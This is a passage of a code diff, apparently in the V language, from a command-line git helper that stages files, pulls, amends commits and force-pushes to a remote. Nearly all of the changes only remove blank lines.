 			if created_temp_git {
 				println('Cleaning up temporary local .git directory...')
 				delete_git_dir(repo_dir)
 			}
 		}
-
 		mut files_to_add := []string{}
 		mut files_to_rm := []string{}
 		for file in filtered_files {
@@ -1509,10 +1263,8 @@ fn main() {
 		}
 		if files_to_add.len > 0 { git_add_files(files_to_add) }
 		if !lazy_push && files_to_rm.len > 0 { git_rm_files(files_to_rm) }
-		
 		println('Committing changes...')
 		has_staged_changes := exec_git_cmd(['git', 'diff', '--cached', '--quiet']).exit_code != 0
-		
 		commits := get_commit_list(branch)
 		if commits.len > 0 {
 			println('Overwriting the previous commit (Amending)...')
@@ -1524,14 +1276,11 @@ fn main() {
 				println('No local unstaged changes to commit. Proceeding with force push...')
 			}
 		}
-
 		println('Overwriting remote history (${force_flag})...')
 		if !push_to_remote(formatted_url, branch, force_flag, true) { return }
-		
 		println('Successfully force-pushed changes.')
 		return
 	}
-	
 	if positional_args.len == 4 {
 		git_url := positional_args[1]
 		commit_msg := positional_args[2]
@@ -1542,33 +1291,26 @@ fn main() {
 			return
 		}
 		defer { os.chdir(original_wd) or {} }
-
 		mut branch := 'main'
 		if branch_override != '' {
 			branch = branch_override
 		} else {
 			branch = get_current_branch()
 		}
-
 		changed_files := get_gitless_changed_files(repo_dir, rel_path, git_url, token, branch, lazy_push)
-		
 		mut filtered_files := []string{}
 		if changed_files.len > 0 {
 			filtered_files = validate_and_filter_files(changed_files) or { return }
 		}
-
 		if filtered_files.len == 0 {
 			println('All changed files were excluded or no changes detected. Nothing to upload.')
 			return
 		}
-
 		if !confirm_upload(filtered_files, auto_confirm) {
 			println('Push canceled.')
 			return
 		}
-
 		formatted_url := format_git_url(git_url, token)
-
 		mut created_temp_git := false
 		defer {
 			if created_temp_git {
@@ -1576,14 +1318,12 @@ fn main() {
 				delete_git_dir(repo_dir)
 			}
 		}
-
 		if !is_git_repo(repo_dir) {
 			delete_git_dir(repo_dir)
 			println('Initializing temporary local repository for commit/push...')
 			if !run_git_cmd(['git', 'init'], 'Failed to initialize repository') { return }
 			if !run_git_cmd(['git', 'symbolic-ref', 'HEAD', 'refs/heads/' + branch], 'Failed to set target branch') { return }
 			if !run_git_cmd(['git', 'remote', 'add', 'origin', formatted_url], 'Failed to add remote origin') { return }
-
 			println('Fetching remote branch history...')
 			fetch_res := exec_git_cmd(['git', 'fetch', '--depth', '1', 'origin', '${branch}:refs/remotes/origin/${branch}'])
 			if fetch_res.exit_code == 0 {
@@ -1594,14 +1334,12 @@ fn main() {
 			if branch_override != '' {
 				if !run_git_cmd(['git', 'checkout', '-B', branch], 'Failed to checkout branch') { return }
 			}
-			
 			println('Checking if remote branch exists...')
 			ls_res := exec_git_cmd(['git', 'ls-remote', '--heads', formatted_url, branch])
 			mut remote_exists := false
 			if ls_res.exit_code == 0 && ls_res.output.trim_space() != '' {
 				remote_exists = true
 			}
-
 			if remote_exists {
 				println('Auto-syncing (pulling) with remote repository...')
 				has_changes_to_stash := exec_git_cmd(['git', 'status', '--porcelain']).output.trim_space() != ''
@@ -1612,13 +1350,10 @@ fn main() {
 						stashed = true
 					}
 				}
-
 				pull_res := exec_git_cmd(['git', 'pull', formatted_url, branch, '--rebase'])
-
 				if stashed {
 					exec_git_cmd(['git', 'stash', 'pop'])
 				}
-
 				if pull_res.exit_code != 0 {
 					println('Error: Auto-sync (pull) failed. This usually happens if there are merge conflicts.')
 					println('Details: ' + pull_res.output.trim_space())
@@ -1631,7 +1366,6 @@ fn main() {
 				println('Remote branch "${branch}" not found (likely empty repository). Skipping pull.')
 			}
 		}
-
 		mut files_to_add := []string{}
 		mut files_to_rm := []string{}
 		for file in filtered_files {
@@ -1643,7 +1377,6 @@ fn main() {
 		}
 		if files_to_add.len > 0 { git_add_files(files_to_add) }
 		if !lazy_push && files_to_rm.len > 0 { git_rm_files(files_to_rm) }
-		
 		println('Committing changes...')
 		has_staged_changes := exec_git_cmd(['git', 'diff', '--cached', '--quiet']).exit_code != 0
 		if has_staged_changes {
@@ -1651,14 +1384,11 @@ fn main() {
 		} else {
 			println('No local unstaged changes to commit. Proceeding with push...')
 		}
-
 		println('Pushing to remote...')
 		if !push_to_remote(formatted_url, branch, '', false) { return }
-		
 		println('Successfully pushed changes.')
 		return
 	}
-	
 	if positional_args.len == 3 {
 		git_url := positional_args[1]
 		file_path := positional_args[2]
@@ -1672,21 +1402,17 @@ fn main() {
 			println('Error: No git repository found to amend.')
 			return
 		}
-
 		mut branch := 'main'
 		if branch_override != '' {
 			branch = branch_override
 		} else {
 			branch = get_current_branch()
 		}
-
 		changed_files := get_gitless_changed_files(repo_dir, rel_path, git_url, token, branch, lazy_push)
-		
 		mut filtered_files := []string{}
 		if changed_files.len > 0 {
 			filtered_files = validate_and_filter_files(changed_files) or { return }
 		}
-
 		if filtered_files.len == 0 {
 			println('No file changes detected compared to remote. Proceeding with amending history anyway...')
 		} else {
@@ -1695,7 +1421,6 @@ fn main() {
 				return
 			}
 		}
-
 		commit_info := get_commit_info('HEAD')
 		println('\nWarning: This action will amend and overwrite the last commit on the remote branch "${branch}":')
 		println('  -> ${commit_info}')
@@ -1706,9 +1431,7 @@ fn main() {
 				return
 			}
 		}
-
 		formatted_url := format_git_url(git_url, token)
-		
 		mut files_to_add := []string{}
 		mut files_to_rm := []string{}
 		for file in filtered_files {
@@ -1720,13 +1443,10 @@ fn main() {
 		}
 		if files_to_add.len > 0 { git_add_files(files_to_add) }
 		if !lazy_push && files_to_rm.len > 0 { git_rm_files(files_to_rm) }
-		
 		println('Amending last commit...')
 		if !run_git_cmd(['git', 'commit', '--amend', '--no-edit'], 'Failed to amend commit') { return }
-
 		println('Force pushing updated commit to remote (${force_flag})...')
 		if !push_to_remote(formatted_url, branch, force_flag, true) { return }
-		
 		println('Successfully amended last commit and force pushed.')
 		return
 	}
